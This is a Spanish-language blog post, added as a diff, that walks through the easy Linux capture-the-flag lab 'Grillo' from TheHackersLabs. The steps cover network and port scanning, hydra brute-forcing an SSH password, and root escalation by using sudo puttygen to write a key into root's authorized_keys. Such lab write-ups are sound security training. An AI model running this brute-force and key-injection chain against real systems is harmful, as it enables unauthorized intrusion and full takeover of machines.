@@ -1,0 +1,87 @@
+---
+layout: post
+title: "Grillo"
+date: 2024-06-06 11:35:23
+category: sample
+vm: hackerlabs
+---
+
+<style>
+  .post-content {
+    color: #51c25be1; /* Cambia el color del texto */
+  }
+</style>
+
+<table class="log">
+  <tr>
+    <td rowspan="5"><img src="/notas/public/img/thehackerlabs/thehackerlabs.png" width=260></td>
+    <td></td>
+  </tr>
+  <tr> <td><strong>Máquina:</strong> Grillo </td> </tr>
+  <tr> <td><strong>SO:</strong> Linux</td> </tr>
+  <tr> <td><strong>Dificultad:</strong> <span class="easy">Facil</span></td> </tr>
+  <tr> <td><strong><a href="https://thehackerslabs.com/grillo/" target="_blank"> Descarga</a></strong></td> </tr>
+</table>
+
+<br>
+
+![img](/notas/public/img/thehackerlabs/Grillo/host.png){:.margin}
+
+**1\.** Identificando dispositivos en la red.
+
+`sudo arp-scan -I enp2s0 --localnet`
+
+![img](/notas/public/img/thehackerlabs/Grillo/arp.png){:.margin}
+
+**2\.** Escaneo de puertos y servicios activos.
+
+`sudo nmap -p- --open -sCV -T5 --min-rate=5000 -n -Pn 192.168.1.8`
+
+![img](/notas/public/img/thehackerlabs/Grillo/nmap.png){:.margin}
+
+**3\.** En la web tenemos la pagina de Apache por 'defecto', viendo el codigo fuente por debajo encontramos algo.
+
+`http://192.168.1.8`
+
+![img](/notas/public/img/thehackerlabs/Grillo/80.png){:.margin}
+![img](/notas/public/img/thehackerlabs/Grillo/80code.png){:.margin}
+
+**4\.** Haciendo fuerza bruta al ssh. 
+
+`hydra -l melanie -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.8`
+
+![img](/notas/public/img/thehackerlabs/Grillo/hydra.png){:.margin}
+
+**5\.** Me conecto por ssh.
+
+`ssh melanie@192.168.1.8`
+
+![img](/notas/public/img/thehackerlabs/Grillo/sshmelanie.png){:.margin}
+
+**6\.** Reviso binarios que pueda ejecutarlo como sudo.
+
+`sudo -ll`
+
+![img](/notas/public/img/thehackerlabs/Grillo/sudoll.png){:.margin}
+
+**7\.** Genero claves ssh.
+
+`ssh-keygen`
+
+![img](/notas/public/img/thehackerlabs/Grillo/sshkeygen.png){:.margin}
+
+**8\.** Escalando privilegios.
+
+_\- Agrego la clave publica al authorized_keys de root_
+
+`sudo /usr/bin/puttygen .ssh/id_rsa.pub -O public-openssh -o /root/.ssh/authorized_keys`
+
+_\- Me conecto por ssh como root_
+
+`ssh root@192.168.1.8`
+
+![img](/notas/public/img/thehackerlabs/Grillo/root.png){:.margin}
+
+<br>
+
+<span class="finish">_Finalizado._</span>
